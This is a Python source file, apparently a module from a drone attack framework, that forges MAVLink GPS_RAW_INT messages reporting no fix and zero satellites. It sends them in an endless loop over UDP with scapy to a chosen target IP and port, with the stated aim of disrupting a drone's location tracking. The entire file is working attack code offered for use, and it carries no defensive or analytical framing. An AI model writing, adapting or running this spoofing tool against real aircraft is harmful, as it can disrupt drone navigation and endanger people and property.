from core.base import BaseModule
from pymavlink import mavutil
from scapy.all import *
import time

class SpaceBasedSignalForgeryModule(BaseModule):
    def __init__(self):
        super().__init__(
            name="Space-Based Signal Forgery",
            description="Simulates a GPS signal with zero satellites visible to disrupt the drone's location tracking.",
            category="Navigation Manipulation"
        )
        self.options = {
            "target_ip": {"value": "", "required": True, "description": "Target IP address"},
            "target_port": {"value": 14550, "required": True, "description": "Target port"}
        }

    def create_gps_raw_int(self, mav):
        """
        Create a MAVLink GPS_RAW_INT message with zero satellites visible.
        """
        gps_raw_int = mav.gps_raw_int_encode(
            time_usec=int(time.time() * 1e6),
            fix_type=1,  # No fix
            lat=473566100,  # Latitude (in degrees * 1e7)
            lon=854619300,  # Longitude (in degrees * 1e7)
            alt=1500,  # Altitude (in meters * 1000)
            eph=100,  # GPS HDOP horizontal dilution of position
            epv=100,  # GPS VDOP vertical dilution of position
            vel=500,  # GPS ground speed (m/s * 100)
            cog=0,  # Course over ground (degrees * 100)
            satellites_visible=0  # Number of satellites visible set to 0
        )
        return gps_raw_int.pack(mav)

    def run(self):
        target_ip = self.options["target_ip"]["value"]
        target_port = int(self.options["target_port"]["value"])

        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        while True:
            gps_packet = self.create_gps_raw_int(mav)
            self.send_mavlink_packet(gps_packet, target_ip, target_port)
            print(f"Sent GPS spoofing packet with 0 satellites to {target_ip}:{target_port}")
            time.sleep(1)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        send(packet)
